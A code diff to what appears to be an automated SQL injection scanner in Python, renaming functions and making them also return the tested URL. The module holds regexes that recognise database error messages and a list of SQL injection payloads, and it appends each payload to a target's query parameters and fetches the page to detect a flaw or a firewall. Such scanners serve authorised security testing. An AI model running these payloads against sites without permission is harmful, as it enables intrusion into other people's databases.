@@ -1,8 +1,8 @@
-from sqlinjection import check_waf
+from sqlinjection import CheckWaf
 import re
 import core
 
-def sqlerror(source):
+def SQLError(source):
     sql_errors = {"MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
                   "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
                   "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_",r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string",r"Microsoft OLE DB Provider for ODBC Drivers"),
@@ -20,7 +20,7 @@ def sqlerror(source):
                 return True, db
     return False, None
 
-def error_in(domain,queries,old_html):
+def ErrorIn(domain,queries,old_html):
     payloads= ("'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0", ") AND 1998=1532 AND (5526=5526", " AND 5434=5692%23",
                " %' AND 5268=2356 AND '%'='", " ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV", '`', '`)',
                '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
@@ -28,12 +28,12 @@ def error_in(domain,queries,old_html):
         website = domain + "?" + ("&".join([param + payload for param in queries]))
         source = core.gethtml(website)
         if source:
-            vulnerable,db=sqlerror(source)
+            vulnerable,db=SQLError(source)
             if vulnerable and db !=None:
-                return True,db
-        if check_waf.check_have_waf(old_html, source):
-            return False,"waf"
+                return True,db,website
+        if CheckWaf.CheckHaveWaf(old_html, source):
+            return False,"waf",website
         else:
-            return False,None
+            return False,None,None
 
 
